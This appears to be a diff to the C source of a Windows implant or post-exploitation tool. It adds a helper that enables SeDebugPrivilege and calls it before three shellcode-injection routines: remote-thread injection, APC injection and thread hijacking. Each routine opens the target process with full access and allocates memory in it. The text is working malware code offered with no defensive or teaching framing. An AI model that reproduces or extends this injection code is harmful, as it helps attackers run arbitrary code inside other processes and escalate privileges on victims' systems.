@@ -1210,7 +1210,16 @@ static char *phantom_load(const uint8_t *sc, size_t sc_len) {
 
 // ── Process injection ─────────────────────────────────────────────────────────
 
+static void try_sedebug(void) {
+    HANDLE hSelf = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hSelf)) {
+        enable_privilege(hSelf, "SeDebugPrivilege");
+        CloseHandle(hSelf);
+    }
+}
+
 static char *inject_remote(int pid, const uint8_t *sc, size_t sc_len) {
+    try_sedebug();
     HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
     if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed (err %lu)",GetLastError()); return e; }
     LPVOID mem = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
@@ -1228,6 +1237,7 @@ static char *inject_remote(int pid, const uint8_t *sc, size_t sc_len) {
 }
 
 static char *inject_apc(int pid, const uint8_t *sc, size_t sc_len) {
+    try_sedebug();
     HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
     if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed %lu",GetLastError()); return e; }
     LPVOID mem = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
@@ -1256,6 +1266,7 @@ static char *inject_apc(int pid, const uint8_t *sc, size_t sc_len) {
 // ── Thread hijack injection ───────────────────────────────────────────────────
 
 static char *thread_hijack(DWORD pid, const uint8_t *sc, size_t sc_len) {
+    try_sedebug();
     HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed (err %lu)",GetLastError()); return e; }
     LPVOID mem = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
